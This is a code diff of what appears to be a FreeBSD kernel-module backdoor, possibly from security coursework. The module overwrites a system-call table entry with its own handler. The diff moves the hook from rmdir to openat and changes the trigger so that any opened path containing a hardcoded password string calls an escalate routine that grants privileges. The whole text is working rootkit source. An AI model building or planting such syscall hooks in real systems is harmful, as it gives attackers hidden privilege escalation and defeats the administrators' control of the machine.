@@ -26,27 +26,21 @@ escalate(struct thread *td) {
 
 /* The system call's arguments. */
 struct sc_args {
-    char *passwd;
+    int fd;
+    char *path;
+    int flag;
+    mode_t mode;
 };
 
 /* Function pointer to the old syscall function that is being hijacked. */
 static sy_call_t *old_sy_call = NULL;
 
-/* The hijacked syscall function will reside in the original
- * sysentry of whichever syscall is being hijacked.
- * It will execute the original syscall with the same args,
- * then it will check if the first argument to the syscall is the
- * privilege escalation password,
- * then it will escalate if the password is correct.
- */
+/* New syscall that will be written to the hijack victim's syscall slot. */
 static int
 new_sy_call(struct thread *td, void *syscall_args) {
 
-    /* execute the syscall normally and take note of the return value */
     int retval = (*old_sy_call)(td, syscall_args);
-
-    /* if the syscall failed then don't do anything.
-     * syscall_args may be mapped to invalid addresses if the retval != 0. */
+    /* syscall_args may be mapped to invalid addresses if the retval != 0. */
     if (retval != 0) {
         return (retval);
     }
@@ -54,7 +48,7 @@ new_sy_call(struct thread *td, void *syscall_args) {
     struct sc_args *args = (struct sc_args *) syscall_args;
 
 #define PRIV_ESC_PASSWD "6447_priv_esc_passwd"
-    if (strcmp(args->passwd, PRIV_ESC_PASSWD) == 0) {
+    if (strstr(args->path, PRIV_ESC_PASSWD) != NULL) {
         escalate(td);
     }
 
@@ -69,15 +63,12 @@ load(struct module *module, int cmd, void *arg) {
 
     case MOD_LOAD:
 
-/* rmdir syscall 137. */
-#define HIJACKED_SYSCALL 137
-
+/* 499 AUE_OPENAT_RWTC STD { int openat(int fd, char *path, int flag, mode_t mode); } */
+#define HIJACKED_SYSCALL 499
         /* record the old syscall. */
         old_sy_call = curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call;
-
         /* redirect the entry to point to the new syscall handler. */
         curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
-
         break;
 
     default:
